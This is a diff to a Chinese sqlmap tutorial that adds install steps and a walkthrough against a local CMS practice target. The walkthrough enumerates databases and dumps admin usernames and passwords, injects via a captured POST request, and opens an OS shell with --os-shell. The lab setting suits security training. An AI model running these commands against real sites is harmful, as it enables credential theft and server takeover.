@@ -1,10 +1,21 @@
->
->
->
+[SQLMap](https://github.com/sqlmapproject/sqlmap) 是一款专注于SQLi 的工具，堪称神器。SQLmap 基于Python 语言编写的命令行工具，集成在Kali 中。
 
+## 0x00：安装与更新
 
+Kali 自带SQLMap 
 
-## 使用
+```bash
+sudo apt-get update
+sudo apt-get install sqlmap  如果安装了，那么就是更新
+```
+
+源码安装
+
+```bash
+git clone https://github.com/sqlmapproject/sqlmap.git   
+```
+
+## 0x01：参数速查
 
 #### 用法
 
@@ -360,5 +371,91 @@ python sqlmap.py [选项]
 
 
 
+## 0x02：简单实操
 
+利用sqlmap 注入得到cms 网站管理员账密
+
+```bash
+注入点：http://127.0.0.1/cms/show.php?id=33
+
+python sqlmap.py  -u "http://127.0.0.1/cms/show.php?id=33" 
+```
+
+![image-20230824204624937](./imgs/10d675c3febba3a589d410147f2930fc.png)
+
+```sql
+python sqlmap.py -u "http://127.0.0.1/cms/show.php?id=33" --dbs --batch
+```
+
+![image-20230824204712533](./imgs/dc15921f58360b13bc9c841d8e7f318e.png)
+
+```sql
+python sqlmap.py -u "http://127.0.0.1/cms/show.php?id=33" --current-db 
+```
+
+![image-20230824204749579](./imgs/cf592b1be71fa91db4ffc11471cd0c0e.png)
+
+```sql
+python sqlmap.py -u "http://127.0.0.1/cms/show.php?id=33" -D "cms" --tables
+```
+
+![image-20230824204802046](./imgs/e1322b6b5a655aa76d33e93f351779f8.png)
+
+
+
+```sql
+python sqlmap.py -u "http://127.0.0.1/cms/show.php?id=33" -D "cms" -T "cms_users" --columns
+
+```
+
+![image-20230824204836468](./imgs/58ea406ae750d6d3d42882c82bb02f54.png)
+
+```sql
+python sqlmap.py -u "http://127.0.0.1/cms/show.php?id=33" -D "cms" -T "cms_users" -C "username,password" --dump
+```
+
+![image-20230824205204198](./imgs/bc9bb4bcb50d94818f59bd5543425d32.png)
+
+#### POST注入
+
+```sql
+sqlmap -r  post数据包的文件
+```
+
+以cms这个靶场环境为例，http://127.0.0.1/cms/admin/login.php
+
+<img src="./imgs/73ab13eba3ebb3b57713d155ef2dc3e2.png" alt="image-20230824194243653" style="zoom:33%;" />
+
+发送post请求，bp抓包
+
+![image-20230824194346689](./imgs/4adafc4133dd80dc4367d79e99ed80f4.png)
+
+选择一个位置保存
+
+<img src="./imgs/9dd06ef923981876b83679d3888ed1bd.png" alt="image-20230824195609397" style="zoom:33%;" />
+
+然后使用sqlmap判断是否存在注入点
+
+```python
+python sqlmap.py -r C:\\Users\zs\\Documents\\1.txt
+```
+
+![在这里插入图片描述](./imgs/1b2a15343d964b749757e34c941026af.gif)
+
+
+#### GetShell
+
+- 受到secure_file_priv 选项的限制
+
+- 目标系统Web 根目录的绝对路径
+
+- 目录权限
+
+```sql
+1	sqlmap -u "http://127.0.0.1/cms/show.php?id=32" --os-shell
+```
+
+![image-20230824194011365](./imgs/871ffcd076cf9036b2d8e712adf25dac.png)
+
+![image-20230824194102316](./imgs/e351ceaf47a0731f044bbd09ee77b290.png)
 
